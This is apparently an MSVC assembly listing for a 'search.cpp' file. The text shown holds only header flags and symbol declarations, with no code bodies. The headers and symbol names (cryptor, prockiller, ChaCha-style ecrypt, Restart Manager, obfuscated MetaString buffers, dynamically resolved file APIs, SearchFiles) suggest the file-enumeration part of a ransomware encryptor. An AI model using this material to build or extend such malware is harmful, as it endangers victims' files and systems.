; Listing generated by Microsoft (R) Optimizing Compiler Version 19.39.33522.0 

include listing.inc

INCLUDELIB LIBCMT
INCLUDELIB OLDNAMES

msvcjmc	SEGMENT
__0ED14FEE_winpackagefamily@h DB 01H
__F92EF742_winapifamily@h DB 01H
__22E515EB_sdkddkver@h DB 01H
__FE09AF47_concurrencysal@h DB 01H
__C073CA79_sal@h DB 01H
__D6AFE870_vadefs@h DB 01H
__D63E96CF_vcruntime@h DB 01H
__514B86D7_excpt@h DB 01H
__9A7D38D9_stdarg@h DB 01H
__29F49F40_specstrings_undef@h DB 01H
__D0F42932_specstrings_strict@h DB 01H
__F00405FD_sdv_driverspecs@h DB 01H
__173E09CA_driverspecs@h DB 01H
__9A452361_specstrings@h DB 01H
__1B0272D9_corecrt@h DB 01H
__74484FB3_corecrt_wctype@h DB 01H
__1EC467ED_ctype@h DB 01H
__98517906_kernelspecs@h DB 01H
__D3497022_basetsd@h DB 01H
__61CC25A1_errno@h DB 01H
__3EADF068_vcruntime_string@h DB 01H
__E4C945B4_corecrt_memcpy_s@h DB 01H
__8EAFF484_corecrt_memory@h DB 01H
__6490AEC5_corecrt_wstring@h DB 01H
__E8295E1E_string@h DB 01H
__7FCB5136_guiddef@h DB 01H
__FF8A9E11_pshpack4@h DB 01H
__D5438902_poppack@h DB 01H
__FB07E2A3_pshpack2@h DB 01H
__F6906775_pshpack8@h DB 01H
__F9415CFA_pshpack1@h DB 01H
__E58C6F1C_apiset@h DB 01H
__A5C52262_ktmtypes@h DB 01H
__FBBA8F9D_winnt@h DB 01H
__A32D3D2C_minwindef@h DB 01H
__7D798299_windef@h DB 01H
__9AE108E9_apisetcconv@h DB 01H
__9CE53D2C_minwinbase@h DB 01H
__5D0AA210_apiquery2@h DB 01H
__4DD4E726_processenv@h DB 01H
__3575CC96_fileapi@h DB 01H
__8EA220E6_fileapifromapp@h DB 01H
__BF9B31FE_debugapi@h DB 01H
__C3AFE134_utilapiset@h DB 01H
__76F69E51_handleapi@h DB 01H
__7E63D784_errhandlingapi@h DB 01H
__FFA7003C_fibersapi@h DB 01H
__8971CECF_namedpipeapi@h DB 01H
__46C9D8A6_profileapi@h DB 01H
__98D4F0A3_heapapi@h DB 01H
__50EF2A88_ioapiset@h DB 01H
__92EA1464_synchapi@h DB 01H
__A53D8AED_interlockedapi@h DB 01H
__B506CAAF_processthreadsapi@h DB 01H
__FF735694_sysinfoapi@h DB 01H
__29589789_memoryapi@h DB 01H
__E9C7A663_enclaveapi@h DB 01H
__D035F9F7_threadpoollegacyapiset@h DB 01H
__C899130C_threadpoolapiset@h DB 01H
__E0441EE7_jobapi@h DB 01H
__CEF86838_jobapi2@h DB 01H
__35AC6B9A_wow64apiset@h DB 01H
__C8AE41A5_libloaderapi@h DB 01H
__CC9E232D_securitybaseapi@h DB 01H
__C9D0C9B8_namespaceapi@h DB 01H
__30FF9CAD_systemtopologyapi@h DB 01H
__4D358795_processtopologyapi@h DB 01H
__40446D10_securityappcontainer@h DB 01H
__3A952EDF_realtimeapiset@h DB 01H
__F4865F4B_winerror@h DB 01H
__53C1BD93_timezoneapi@h DB 01H
__1FFBEDBF_winbase@h DB 01H
__43D3FA34_wingdi@h DB 01H
__D24A7391_tvout@h DB 01H
__7713A6C8_winuser@h DB 01H
__0B345F71_datetimeapi@h DB 01H
__9AC6960C_winnls@h DB 01H
__973A40A8_stringapiset@h DB 01H
__CC46FEE2_wincontypes@h DB 01H
__97D70BE1_consoleapi@h DB 01H
__27EC5E18_consoleapi2@h DB 01H
__262E342F_consoleapi3@h DB 01H
__641DCD70_wincon@h DB 01H
__5A96C7A7_verrsrc@h DB 01H
__B69C6FF2_winver@h DB 01H
__7AEB8C37_reason@h DB 01H
__59F1A8A9_winreg@h DB 01H
__EE0E2B7F_wnnc@h DB 01H
__DCDB7054_winnetwk@h DB 01H
__EDC72EEB_cderr@h DB 01H
__95F9199D_dde@h DB 01H
__66427627_ddeml@h DB 01H
__957C29A0_dlgs@h DB 01H
__12EA15AF_lzexpand@h DB 01H
__62131F15_mmsyscom@h DB 01H
__47E68D49_mciapi@h DB 01H
__5D7DD356_mmiscapi@h DB 01H
__7223D2EF_mmiscapi2@h DB 01H
__A330DBB3_playsoundapi@h DB 01H
__601B366F_mmeapi@h DB 01H
__1134ADD5_timeapi@h DB 01H
__93F2265A_joystickapi@h DB 01H
__DF6EB4E3_mmsystem@h DB 01H
__BD641FCB_nb30@h DB 01H
__DF8704F0_rpcdcep@h DB 01H
__5C6CA7BB_rpcdce@h DB 01H
__853533C4_rpcnsi@h DB 01H
__2D2406C3_rpcnterr@h DB 01H
__64521D71_rpcasync@h DB 01H
__AADCBA08_rpc@h DB 01H
__19E26CFF_shellapi@h DB 01H
__1E9F31D3_winperf@h DB 01H
__32C6F875_winsock@h DB 01H
__7953A3F8_bcrypt@h DB 01H
__E4169492_ncrypt@h DB 01H
__AF3DDDC3_dpapi@h DB 01H
__D1E23BF2_wincrypt@h DB 01H
__82AB4779_winefs@h DB 01H
__1FE431C9_rpcnsip@h DB 01H
__2B741F2D_rpcsal@h DB 01H
__92623256_rpcndr@h DB 01H
__9C18532E_wtypesbase@h DB 01H
__EA2E1D6D_wtypes@h DB 01H
__7DDD9F45_winioctl@h DB 01H
__E550A843_winsmcrd@h DB 01H
__9809C1BA_winscard@h DB 01H
__EA174FA4_prsht@h DB 01H
__0E1BD114_winspool@h DB 01H
__45DED006_corecrt_malloc@h DB 01H
__13F5961F_stddef@h DB 01H
__FD6DBD68_corecrt_search@h DB 01H
__E2E33A61_corecrt_wstdlib@h DB 01H
__10D4A829_limits@h DB 01H
__6E5ACABA_stdlib@h DB 01H
__30B1AFDA_unknwnbase@h DB 01H
__328C1996_objidlbase@h DB 01H
__C4E06B6A_cguid@h DB 01H
__434718C5_combaseapi@h DB 01H
__DE6FDEF1_unknwn@h DB 01H
__CCE0BACC_objidl@h DB 01H
__8C7011E5_oaidl@h DB 01H
__2E0B7863_propidlbase@h DB 01H
__BF4CF2EC_coml2api@h DB 01H
__6D897344_oleidl@h DB 01H
__1129FC2C_servprov@h DB 01H
__757952E4_msxml@h DB 01H
__B1191D53_urlmon@h DB 01H
__404D1A47_propidl@h DB 01H
__A1C63593_objbase@h DB 01H
__C1B0A9CB_oleauto@h DB 01H
__24EAF61F_ole2@h DB 01H
__2B1843DA_commdlg@h DB 01H
__81DDEDE3_stralign@h DB 01H
__2134D1B4_winsvc@h DB 01H
__11C07376_mcx@h DB 01H
__577CE3E7_ime_cmodes@h DB 01H
__1E72C31E_imm@h DB 01H
__E15BF856_windows@h DB 01H
__832A4112_inaddr@h DB 01H
__C59B8995_ws2def@h DB 01H
__F9202461_qos@h DB 01H
__50CB22FA_WinSock2@h DB 01H
__32E3D3D2_xkeycheck@h DB 01H
__CFD6EDFA_yvals_core@h DB 01H
__BE6CFB00___msvc_sanitizer_annotate_container@hpp DB 01H
__A3D3E4E8_vcruntime_new@h DB 01H
__8D1A214D_vcruntime_new_debug@h DB 01H
__935DC21B_crtdbg@h DB 01H
__497BC13E_crtdefs@h DB 01H
__DDE8D0E0_use_ansi@h DB 01H
__AE7FBCDF_yvals@h DB 01H
__44420885_corecrt_stdio_config@h DB 01H
__AB601D8D_corecrt_wstdio@h DB 01H
__C1EC35D3_stdio@h DB 01H
__1C5946C5_cstdio DB 01H
__54ADA280_cstring DB 01H
__EF1F6BBA_corecrt_wconio@h DB 01H
__3D1D430C_corecrt_wdirect@h DB 01H
__8ECB7138_corecrt_share@h DB 01H
__DB7FEBA6_corecrt_wio@h DB 01H
__9A9F0068_corecrt_wprocess@h DB 01H
__369A9BC3_corecrt_wtime@h DB 01H
__CE789B9D_types@h DB 01H
__9901C817_stat@h DB 01H
__3FCAD62E_wchar@h DB 01H
__86D29096_cwchar DB 01H
__26E6E2A9_xtr1common DB 01H
__C51215A0_iosfwd DB 01H
__AEA28616_stdint@h DB 01H
__A561EB1D_cstdint DB 01H
__BB16330F_corecrt_math@h DB 01H
__3BF2A406_math@h DB 01H
__183F0A60_cstdlib DB 01H
__B9985323_float@h DB 01H
__6F1D8D42_cfloat DB 01H
__9CD02892_climits DB 01H
__F5A7E1DF_intrin0@inl@h DB 01H
__50567835_intrin0@h DB 01H
__09FBC026_limits DB 01H
__BDF4D0CD_cstddef DB 01H
__7C4A1519_type_traits DB 01H
__FA77ED4C_malloc@h DB 01H
__89766DA4_corecrt_terminate@h DB 01H
__EEF52EF9_eh@h DB 01H
__85F4241F_vcruntime_exception@h DB 01H
__8124AFA8_exception DB 01H
__5003AD96_new DB 01H
__8B28237E_xatomic@h DB 01H
__E4CFD974_initializer_list DB 01H
__2F328FEB_utility DB 01H
__91F58E7E___msvc_iter_core@hpp DB 01H
__C27AFEEB_xutility DB 01H
__45A7EC28_xmemory DB 01H
__31746AB4_xstring DB 01H
__1392A162_cctype DB 01H
__C1864A34_string DB 01H
__9D469CC8_common@h DB 01H
__016BD130_queue@h DB 01H
__3106C9CE_memory@h DB 01H
__93890D6E_filesystem@h DB 01H
__145BE446_shtypes@h DB 01H
__519668A6_shlwapi@h DB 01H
__6A2859B8_global_parameters@h DB 01H
__AE454FA2_lmcons@h DB 01H
__67F5F762_mprapidef@h DB 01H
__1F2B86E1_ipifcons@h DB 01H
__EFFE9D94_ifdef@h DB 01H
__AF31E881_ifmib@h DB 01H
__8BC2807C_nldef@h DB 01H
__7ABE0907_ipmib@h DB 01H
__2E95CCCA_tcpmib@h DB 01H
__2798F2DA_udpmib@h DB 01H
__FCC255DB_iprtrmib@h DB 01H
__B01BC3FD_in6addr@h DB 01H
__D834A143_ipexport@h DB 01H
__0A9237D2_time@h DB 01H
__82EB0637_iptypes@h DB 01H
__6063C472_tcpestats@h DB 01H
__63D3B6A5_netioapi@h DB 01H
__D1674A86_iphlpapi@h DB 01H
__F5D3A320_RestartManager@h DB 01H
__AAAC9FBE_TlHelp32@h DB 01H
__9B49ECA4_getapi@h DB 01H
__62F75DE5_metarandom2@h DB 01H
__93160BA8_array DB 01H
__722C6D77_MetaString@h DB 01H
__457AF2B3_logs@h DB 01H
__636D4263_ecrypt-config@h DB 01H
__B6C0B8F2_ecrypt-machine@h DB 01H
__94D60663_ecrypt-portable@h DB 01H
__80D1E77F_ecrypt-sync@h DB 01H
__ED66B863_memory@h DB 01H
__62742911_prockiller@h DB 01H
__712596B7_cryptor@h DB 01H
__A2C9C4CE_cmath DB 01H
__D3D649AB_iterator DB 01H
__F7972D0B_share@h DB 01H
__F338F6F9___msvc_system_error_abi@hpp DB 01H
__8178323E_cerrno DB 01H
__086A95F5_stdexcept DB 01H
__8C4E33AA_xcall_once@h DB 01H
__06EAA9D0_xerrc@h DB 01H
__647A58C6_ctime DB 01H
__74BE1DAA_xtimec@h DB 01H
__BCA6E753_xthreads@h DB 01H
__62CE9CE4_atomic DB 01H
__3313218A_system_error DB 01H
__851B68E1_vcruntime_typeinfo@h DB 01H
__B2A50DF2_typeinfo DB 01H
__B555CCA8_memory DB 01H
__99109BA7_xfacet DB 01H
__F99E20B2___msvc_xlocinfo_types@hpp DB 01H
__791C33B7_locale@h DB 01H
__8B93D6B1_clocale DB 01H
__AD2CEE3A_xlocinfo DB 01H
__EE4A1E85_xlocale DB 01H
__94C99929_xiosbase DB 01H
__0ACA2D49_streambuf DB 01H
__70CD7892_xlocnum DB 01H
__A8CE9780_ios DB 01H
__FD5AC441_ostream DB 01H
__9E8AF17B_istream DB 01H
__A00384F4_iostream DB 01H
__A3B0747C_search@cpp DB 01H
msvcjmc	ENDS
CONST	SEGMENT
?_Fake_alloc@std@@3U_Fake_allocator@1@B	ORG $+1		; std::_Fake_alloc
CONST	ENDS
PUBLIC	RtlSecureZeroMemory
PUBLIC	??2@YAPEAX_KPEAX@Z				; operator new
PUBLIC	?max@?$numeric_limits@_J@std@@SA_JXZ		; std::numeric_limits<__int64>::max
PUBLIC	??0exception@std@@QEAA@QEBDH@Z			; std::exception::exception
PUBLIC	??0exception@std@@QEAA@AEBV01@@Z		; std::exception::exception
PUBLIC	??1exception@std@@UEAA@XZ			; std::exception::~exception
PUBLIC	?what@exception@std@@UEBAPEBDXZ			; std::exception::what
PUBLIC	??_Gexception@std@@UEAAPEAXI@Z			; std::exception::`scalar deleting destructor'
PUBLIC	??0bad_alloc@std@@AEAA@QEBD@Z			; std::bad_alloc::bad_alloc
PUBLIC	??1bad_alloc@std@@UEAA@XZ			; std::bad_alloc::~bad_alloc
PUBLIC	??0bad_alloc@std@@QEAA@AEBV01@@Z		; std::bad_alloc::bad_alloc
PUBLIC	??_Gbad_alloc@std@@UEAAPEAXI@Z			; std::bad_alloc::`scalar deleting destructor'
PUBLIC	??0bad_array_new_length@std@@QEAA@XZ		; std::bad_array_new_length::bad_array_new_length
PUBLIC	??1bad_array_new_length@std@@UEAA@XZ		; std::bad_array_new_length::~bad_array_new_length
PUBLIC	??0bad_array_new_length@std@@QEAA@AEBV01@@Z	; std::bad_array_new_length::bad_array_new_length
PUBLIC	??_Gbad_array_new_length@std@@UEAAPEAXI@Z	; std::bad_array_new_length::`scalar deleting destructor'
PUBLIC	?_Throw_bad_array_new_length@std@@YAXXZ		; std::_Throw_bad_array_new_length
PUBLIC	?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ; std::_Default_allocate_traits::_Allocate
PUBLIC	?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ; std::_Adjust_manually_vector_aligned
PUBLIC	?_Orphan_all@_Container_base0@std@@QEAAXXZ	; std::_Container_base0::_Orphan_all
PUBLIC	?_Swap_proxy_and_iterators@_Container_base0@std@@QEAAXAEAU12@@Z ; std::_Container_base0::_Swap_proxy_and_iterators
PUBLIC	?_Alloc_proxy@_Container_base0@std@@QEAAXAEBU_Fake_allocator@2@@Z ; std::_Container_base0::_Alloc_proxy
PUBLIC	??0_Fake_proxy_ptr_impl@std@@QEAA@AEBU_Fake_allocator@1@AEBU_Container_base0@1@@Z ; std::_Fake_proxy_ptr_impl::_Fake_proxy_ptr_impl
PUBLIC	?_Release@_Fake_proxy_ptr_impl@std@@QEAAXXZ	; std::_Fake_proxy_ptr_impl::_Release
PUBLIC	?copy@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::copy
PUBLIC	?move@?$_Char_traits@_WG@std@@SAPEA_WQEA_WQEB_W_K@Z ; std::_Char_traits<wchar_t,unsigned short>::move
PUBLIC	?length@?$_WChar_traits@_W@std@@SA_KPEB_W@Z	; std::_WChar_traits<wchar_t>::length
PUBLIC	?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z	; std::_WChar_traits<wchar_t>::assign
PUBLIC	?_Xlen_string@std@@YAXXZ			; std::_Xlen_string
PUBLIC	??0?$allocator@_W@std@@QEAA@XZ			; std::allocator<wchar_t>::allocator<wchar_t>
PUBLIC	?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z	; std::allocator<wchar_t>::deallocate
PUBLIC	?allocate@?$allocator@_W@std@@QEAAPEA_W_K@Z	; std::allocator<wchar_t>::allocate
PUBLIC	?max_size@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA_KAEBV?$allocator@_W@2@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::max_size
PUBLIC	?select_on_container_copy_construction@?$_Default_allocator_traits@V?$allocator@_W@std@@@std@@SA?AV?$allocator@_W@2@AEBV32@@Z ; std::_Default_allocator_traits<std::allocator<wchar_t> >::select_on_container_copy_construction
PUBLIC	??0?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_String_val<std::_Simple_types<wchar_t> >
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBAPEB_WXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
PUBLIC	?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
PUBLIC	?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
PUBLIC	??0_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Bxty
PUBLIC	??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
PUBLIC	?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
PUBLIC	??1?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ; std::_String_val<std::_Simple_types<wchar_t> >::~_String_val<std::_Simple_types<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@QEB_W@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
PUBLIC	?_Construct_empty@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Construct_empty
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@$$QEAV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	?_Take_contents@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Take_contents
PUBLIC	??1?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::~basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??4?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV01@AEBV01@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator=
PUBLIC	?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@AEBV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
PUBLIC	?append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append
PUBLIC	?assign@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV12@QEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::assign
PUBLIC	??A?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEA_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::operator[]
PUBLIC	?c_str@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBAPEB_WXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::c_str
PUBLIC	?length@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::length
PUBLIC	?size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::size
PUBLIC	?max_size@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEBA_KXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::max_size
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CA_K_K00@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Calculate_growth@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBA_K_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Calculate_growth
PUBLIC	?_Tidy_deallocate@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXXZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Tidy_deallocate
PUBLIC	?_Swap_proxy_and_iterators@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAXAEAV12@@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Swap_proxy_and_iterators
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Getal@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEBAAEBV?$allocator@_W@2@XZ ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Getal
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEBAAEBV?$allocator@_W@2@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
PUBLIC	??1?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAA@XZ ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::~_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>
PUBLIC	?SearchFiles@filesystem@@YAXV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@_K1PEAE@Z ; filesystem::SearchFiles
PUBLIC	?pWriteFile@@YAHPEAXPEBXKPEAKPEAU_OVERLAPPED@@@Z ; pWriteFile
PUBLIC	?pCreateFileW@@YAPEAXPEB_WKKPEAU_SECURITY_ATTRIBUTES@@KKPEAX@Z ; pCreateFileW
PUBLIC	?pGetLastError@@YAKXZ				; pGetLastError
PUBLIC	?pCloseHandle@@YAHPEAX@Z			; pCloseHandle
PUBLIC	?pFindFirstFileW@@YAPEAXPEB_WPEAU_WIN32_FIND_DATAW@@@Z ; pFindFirstFileW
PUBLIC	?pFindNextFileW@@YAHPEAXPEAU_WIN32_FIND_DATAW@@@Z ; pFindNextFileW
PUBLIC	?pFindClose@@YAHPEAX@Z				; pFindClose
PUBLIC	?plstrcmpW@@YAHPEB_W0@Z				; plstrcmpW
PUBLIC	?pStrStrIW@@YAPEB_WPEB_W0@Z			; pStrStrIW
PUBLIC	?positive_modulo@@YAHHH@Z			; positive_modulo
PUBLIC	??0directory_info_@@QEAA@XZ			; directory_info_::directory_info_
PUBLIC	??1directory_info_@@QEAA@XZ			; directory_info_::~directory_info_
PUBLIC	??_Gdirectory_info_@@QEAAPEAXI@Z		; directory_info_::`scalar deleting destructor'
PUBLIC	?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z ; MakeSearchMask
PUBLIC	??0?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAAPEBDXZ ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0CF@$0CE@U?$integer_sequence@_K$0A@$00$01$02@std@@@@AEBAEE@Z ; MetaBuffer<37,36,std::integer_sequence<unsigned __int64,0,1,2,3> >::decrypt
PUBLIC	??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@QEB_W@Z ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAA@PEBE@Z ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEBA_NXZ ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::isDecrypted
PUBLIC	?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@QEAAPEBDXZ ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?encrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::encrypt
PUBLIC	?decrypt@?$MetaBuffer@$0BH@$0GF@U?$integer_sequence@_K$0A@$00$01$02$03$04@std@@@@AEBAEE@Z ; MetaBuffer<23,101,std::integer_sequence<unsigned __int64,0,1,2,3,4,5> >::decrypt
PUBLIC	?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z ; MakePath
PUBLIC	??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@AEBV10@0@Z ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??$?H_WU?$char_traits@_W@std@@V?$allocator@_W@1@@std@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@0@$$QEAV10@AEBV10@@Z ; std::operator+<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
PUBLIC	??0?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEAA@PEBE@Z ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >
PUBLIC	?isDecrypted@?$MetaBuffer@$0GL@$0BK@U?$integer_sequence@_K$0A@$00$01$02@std@@@@QEBA_NXZ ; MetaBuffer<107,26,std::integer_sequence<unsigned __int64,0,1,2,3> >::isDecrypted
